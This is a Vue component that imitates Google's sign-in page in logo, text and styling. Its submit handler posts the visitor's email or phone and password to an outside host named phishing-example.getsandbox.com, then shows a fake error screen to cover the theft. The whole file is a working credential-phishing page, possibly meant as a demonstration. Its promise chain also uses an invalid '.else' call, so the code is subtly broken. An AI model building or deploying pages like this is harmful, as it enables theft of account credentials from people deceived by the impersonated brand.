<template>
  <div id="app">
    <div v-if="!loggedIn" class="login">
      <img src="./assets/Google_2015_logo.svg" alt="" width="74px" height="37px">
      <h2 id="headingText">Sign in</h2>
      <p class="subheading">with your Google Account</p>
      <form @submit.prevent="handleSubmit" class="login-form">

        <input v-model="user.email_or_phone" type="text" name="login" id="login" placeholder="Email or Phone" class="form-input" required>
        <a href="#" class="form-link">Forgot email?</a>

        <input v-model="user.password" type="password" name="password" id="password" placeholder="Password" class="form-input" required>
        <a href="#" class="form-link">Forgot password?</a>

        <p style="font-size: 14px; margin: 50px 0 0 0;">Not your computer? Use Guest mode to sign in privately.</p>
        <a href="#" class="form-link" style="margin: 0px;">Learn more</a>

        <div class="form-footer">
          <a href="#" class="form-link" style="margin: 0;">Create account</a>
          <input type="submit" value="Next" class="form-submit">
        </div>

      </form>
    </div>

    <div v-else class="error">
      <img src="./assets/Google_2015_logo.svg" alt="" width="74px" height="37px">
      <h2 id="headingText">Sorry, there has been an error.</h2>
      <button class="back-btn" @click="loggedIn = false">Go back</button>
    </div>

    <div class="footer">
      <select name="language" id="language">
        <option value="English (United States)">English (United States)</option>
        <option value="Arabic">Arabic</option>
        <option value="German">German</option>
        <option value="French">French</option>
      </select>
      <div class="footer-links">
        <a href="#" class="f-link">Help</a>
        <a href="#" class="f-link">Privacy</a>
        <a href="#" class="f-link">Terms</a>
      </div>
    </div>
  </div>
</template>

<script>
import axios from 'axios'

export default {
  data () {
    return {
      user: {
        email_or_phone: '',
        password: ''
      },
      loggedIn: false
    }
  },
  methods: {
    handleSubmit () {
      axios.post('https://phishing-example.getsandbox.com/login', this.user)
      .then(() => {
        this.loggedIn = true
      })
      .else((err) => {
        console.log(err)
      })
    }
  }
}
</script>


<style lang="scss">
  @font-face {
    font-family: Product Sans;
    src: url('./assets/fonts/Product Sans Regular.ttf') format('truetype');
  }
  #app {
    font-family: 'Avenir', Helvetica, Arial, sans-serif;
    font-family: 'Product Sans';
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    text-align: center;
    color: #272727;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  .login, .error {
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 426px;
    width: 370px;
    padding: 48px 40px 36px 40px;
    box-shadow: 1px 1px 5px 1px #00000029;
    border-radius: 10px;
  }
  .error {
    justify-content: space-around;
  }
  #headingText {
    padding: 16px 0 0 0;
    margin: 0;
    font-size: 28px;
  }
  .sub-heading {
    color: #3e3e3e;
    font-size: 20px;
  }
  .login-form {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    width: 100%;
  }
  .form-input {
    width: 100%;
    margin-top: 50px;
    outline: 0;
    border: 0;
    border-bottom: 2px solid #00000029;
    font-size: 16px;
    height: 25px;
    &:focus {
      border-bottom: 2px solid #1a73e8;
    }
  }
  .form-link {
    margin-top: 20px;
    text-decoration: none;
    color: #1a73e8;
    font-weight: 500;
  }
  .form-footer {
    display: flex;
    justify-content: space-between;
    align-items: center;
    width: 100%;
    margin-top: 25px;
  }
  .form-submit {
    background-color: #1a73e8;
    color: white;
    border: none;
    text-decoration: none;
    cursor: pointer;
    height: 36px;
    width: 88px;
    border-radius: 5px;
  }
  .footer {
    display: flex;
    justify-content: space-between;
    width: 450px;
    margin-top: 25px;
  }
  .footer-links {
    font-size: 12px;
    color:#9e9e9e;
  }
  .f-link {
    color:#7b7171;
    padding: 0 16px;
    text-decoration: none;
  }
  #language {
    text-decoration: none;
    outline: none;
    border: none;
    color:#7b7171;
  }
  .back-btn {
    background-color: #1a73e8;
    color: white;
    border: none;
    cursor: pointer;
    height: 36px;
    width: 88px;
    border-radius: 5px;
  }
</style>
